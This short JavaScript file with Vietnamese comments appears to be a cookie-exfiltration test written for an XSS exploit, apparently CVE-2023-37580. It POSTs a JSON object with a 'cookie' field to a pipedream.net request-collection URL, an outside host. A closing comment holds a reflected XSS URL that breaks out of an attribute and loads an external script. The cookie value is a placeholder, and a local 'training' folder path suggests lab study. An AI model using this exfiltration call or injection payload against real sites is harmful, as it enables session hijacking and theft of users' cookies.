Content-Type: text/javascript
// Import thư viện Axios
// Bạn cần bao gồm Axios trong dự án của bạn hoặc có thể sử dụng CDN như dưới đây
// <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
// Nếu bạn sử dụng CDN trong trang HTML, bạn không cần dòng này trong tệp .js
const axios = require('axios');

// Tạo đối tượng JSON với nội dung là "abc"
const jsonData = {
  cookie: "abc"
};

// Gửi yêu cầu POST sử dụng Axios
axios.post("https://eoq4auga79zuw4z.m.pipedream.net", jsonData)
  .then(function (response) {
    console.log("Yêu cầu đã hoàn thành thành công", response.data);
  })
  .catch(function (error) {
    console.error("Lỗi trong quá trình xử lý yêu cầu", error);
  });

// https://192.168.5.139/m/momoveto?st=acg”/><script src=C:\Users\Andrea\training\2.Code\CVE\CVE-2023-37580\script.js></script>//
  
